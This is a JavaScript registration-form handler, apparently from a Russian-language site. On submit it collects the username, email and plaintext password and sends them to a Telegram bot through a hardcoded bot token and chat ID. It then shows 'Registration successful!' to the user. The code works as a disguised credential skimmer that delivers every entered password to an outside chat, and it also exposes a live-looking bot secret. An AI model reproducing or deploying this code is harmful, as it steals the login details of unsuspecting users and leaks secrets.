document.getElementById('registrationForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value; // Получаем пароль

    const message = `Новая регистрация:\nИмя пользователя: ${username}\nEmail: ${email}\nПароль: ${password}`;

    const botToken = '6932586490:AAEzITHShe9PAbZAvMKnkS3MpgAbRkhrpcE';
    const chatId = '1513169487';

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    });

    if (response.ok) {
        document.getElementById('message').innerText = 'Регистрация успешна!';
        document.getElementById('registrationForm').reset();
    } else {
        document.getElementById('message').innerText = 'Произошла ошибка. Попробуйте еще раз.';
    }
});